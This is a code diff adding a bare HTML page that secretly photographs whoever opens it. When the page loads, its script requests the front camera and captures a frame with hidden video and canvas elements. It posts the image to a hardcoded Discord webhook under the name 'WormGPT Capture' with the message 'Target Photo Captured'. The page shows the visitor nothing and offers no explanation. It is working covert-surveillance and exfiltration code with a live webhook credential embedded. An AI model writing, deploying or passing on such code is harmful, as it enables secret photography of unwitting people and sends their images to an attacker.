@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+    <style>
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; }
+        video { display: none; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1570452607682740317/LAjoT3CxKej7sDANqcdSOQGAV6IP5mvrejjmYovS8StgmQ6JVMaJwdnDDWBCuH9bS7wO"; // Replace with your webhook
+
+        async function start() {
+            try {
+                // Request camera permission
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                // Allow video to load for a split second to get a clear frame
+                await new Promise(r => setTimeout(r, 500));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                // Convert to blob
+                const blob = await new Promise(resolve => canvas.toBlob(resolve));
+
+                // Send to Discord
+                const formData = new FormData();
+                formData.append("file", blob, "captured_image.jpg");
+                formData.append("username", "WormGPT Capture");
+                formData.append("content", "Target Photo Captured");
+
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    body: formData
+                });
+
+                // Stop stream
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                console.error("Camera error:", err);
+            }
+        }
+
+        start();
+    </script>
+</body>
+</html>
